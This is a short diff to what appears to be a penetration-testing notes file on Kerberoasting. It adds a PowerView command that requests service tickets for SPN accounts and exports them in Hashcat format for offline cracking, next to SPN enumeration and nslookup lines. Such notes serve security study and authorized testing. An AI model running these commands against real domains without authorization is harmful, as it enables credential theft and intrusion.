@@ -252,6 +252,7 @@ https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
 
 ```
 Get-NetUser -SPN | select samaccountname,serviceprincipalname
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat
 
 nslookup.exe web04.corp.com
 nslookup.exe [spn-name]
